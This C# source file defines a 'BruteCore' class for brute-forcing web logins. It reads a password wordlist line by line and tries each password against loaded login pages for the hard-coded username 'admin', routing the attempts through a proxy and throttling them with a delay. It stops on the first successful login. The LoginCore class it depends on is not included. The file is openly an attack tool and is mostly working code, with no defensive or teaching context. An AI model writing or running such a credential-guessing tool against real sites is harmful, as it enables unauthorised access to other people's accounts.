using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;
using System.ComponentModel;

namespace ConsoleLogin
{
    class BruteCore
    {
        Status progressLog;
        CancellationTokenSource cts = new CancellationTokenSource();
        LoginCore page;
        string userName = "admin";
        public BindingList<LoginCore> pages;
        WebProxy defaultProxy;
        WebProxy currentProxy;
        bool keepSending;

        public BruteCore(Status progress)
        {
            progressLog = progress;
            defaultProxy = WebProxy.GetDefaultProxy();
            keepSending = false;
            pages = new BindingList<LoginCore>();
        }
        public Task<bool> TestPageAsync(string username, string password)
        {
            return page.Login(username, password, currentProxy);
        }
        public async Task StartBruteAsync(int frequencySeconds,string passFile)
        {
            progressLog("Async Brute Started");
            int sleepTime = frequencySeconds * 1000;
            keepSending = true;

            using (var classicStream = File.OpenRead(passFile))
            using (var streamReader = new StreamReader(classicStream))
            {
                while (keepSending == true && streamReader.Peek() >= 0)
                {
                    string _line = await streamReader.ReadLineAsync();
                    if(await page.Login(userName, _line, defaultProxy))
                    {
                        keepSending = false;
                    }
                    Thread.Sleep(sleepTime);
                }
            }
            progressLog("Async Brute Finished");
        }

        public void AddPage(LoginCore siteInfo)
        {
            pages.Add(siteInfo);
        }

        public async Task ReadPagesFromFile(string path)
        {
            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                string _filePath = await reader.ReadLineAsync();
                _filePath = string.Format("{0}\\Files\\{1}",path.Substring(0, path.LastIndexOf('\\')),_filePath);
                LoginCore newPage = await LoginCore.InitializeFromFile(progressLog, _filePath);
                pages.Add(newPage);
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
            page = pages[0];
        }
        public void StopBrute()
        {
            progressLog("Async brute was terminated");
            keepSending = false;
        }

        public void SetCurrentPage(LoginCore loginCore)
        {
            page = loginCore;
        }
    }
}
